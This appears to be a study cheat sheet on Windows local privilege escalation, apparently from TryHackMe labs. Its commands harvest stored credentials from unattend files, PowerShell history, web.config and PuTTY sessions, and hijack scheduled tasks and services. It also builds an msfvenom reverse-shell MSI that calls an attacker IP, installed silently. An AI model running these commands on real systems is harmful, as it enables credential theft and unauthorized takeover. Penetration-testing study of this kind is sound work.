## Unattended windows installs

- files which automatically install windows for a user. stored in:

```powershell

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

```

- Look for `<Credentials>`

## Command History

- For cmd:

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

- for powershell:

```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Saved Credentials
```powershell
cmdkey /list
```

- Cant see passwords, but they can be used with:

```powershell
runas /savecred /user:admin cmd.exe
```

## IIS Config

- find `web.config` in these spots:

```powershell

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

```

- And cat them with:

```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## PuTTY

- SSH client for windows, allows for session storage. query with:

```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

## Scheduled Tasks
```powershell
schtasks /query /tn vulntask /fo list /v
```

- look at `Task to run` and `Run as User`. If the task is modifiable, you can execute code as the user which runs it. Check file permissions:

```powershell
icacls C:\tasks\task-to-run.bat
```

- edit it, and run it with:

```powershell
schtasks /run /tn vulntask
```

## AlwaysInstallElevated

- always installs windows installer files `.msi` as privileged user. Check registry:

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
# and
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

- if BOTH are set, create a malicious `.msi` like this:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

- Then run it:

```powershell
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Insecure Executable permissions
```powershell
sc qc WindowsScheduler
```

- checks the service configuration of `WindowsScheduler`. Look at where the executable is (`BINARY_PATH_NAME`), and who is the owner (`SERVICE_START_NAME`). Check the permissions of the file using `icacls <executable>` if it is writeable, you can overwrite it!

```powershell
# then restart the service
sc.exe stop windowsscheduler
sc.exe start windowsscheduler
```

## Unquoted Service Paths
```powershell
sc qc "disk sorter enterprise"
```

- will look for `C:/MyPrograms/Disk.exe` and `C:/MyPrograms/Disk Sorter.exe` first! If these directories are writeable, you can move your binary there and make it executable, and restart it:

```powershell
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

## Insecure Service Permissions

- check DACL from command line with `accesschk` from sysinternals:

```powershell
accesschk64.exe -qlc thmservice
```

- check for permissions of `BUILTIN\Users` to be SERVICE_ALL_ACCESS. Then edit it via:

```powershell
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

## Windows Privs
```powershell
whoami /priv
```

- checks for privileges. for exploits, look at `Priv2Admin` [github](https://github.com/gtworek/Priv2Admin)!

## Unpatched Software
```powershell
wmic product get name,version,vendor
```

- returns a list of installed software with version numbers, look for cves! 
- might not list all! check desktop shortcutes, services or traces of software!

## Automatic Checkers

- WinPeas, PrivescCheck, WES-NG, `/multi/recon/local_exploit_suggester`

## Further Readings:

- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
